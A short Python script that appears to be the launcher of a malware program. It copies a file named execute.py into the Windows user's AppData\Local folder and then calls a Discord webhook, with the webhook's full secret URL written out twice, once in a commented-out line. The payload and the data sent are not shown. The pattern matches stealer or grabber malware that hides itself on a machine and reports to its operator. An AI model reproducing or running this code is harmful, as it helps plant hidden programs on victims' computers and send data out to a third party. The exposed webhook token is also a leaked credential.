import execute
import os
import shutil
from webhook import webhook_send
def main():
    original = 'execute.py'
    target = f'C:/Users/{os.getlogin()}/AppData/Local/execute.py'

    shutil.copyfile(original, target)
    webhook_send("https://discord.com/api/webhooks/909182496585965618/9nStSQhlnENdHgiL0MnoQtaqGl3YUnU5p1R-MbNRJ6tSfySCySHV4lf4Qqma4xEMFMLK")



if __name__ == "__main__":
    main()
    #webhook_send("https://discord.com/api/webhooks/909182496585965618/9nStSQhlnENdHgiL0MnoQtaqGl3YUnU5p1R-MbNRJ6tSfySCySHV4lf4Qqma4xEMFMLK")
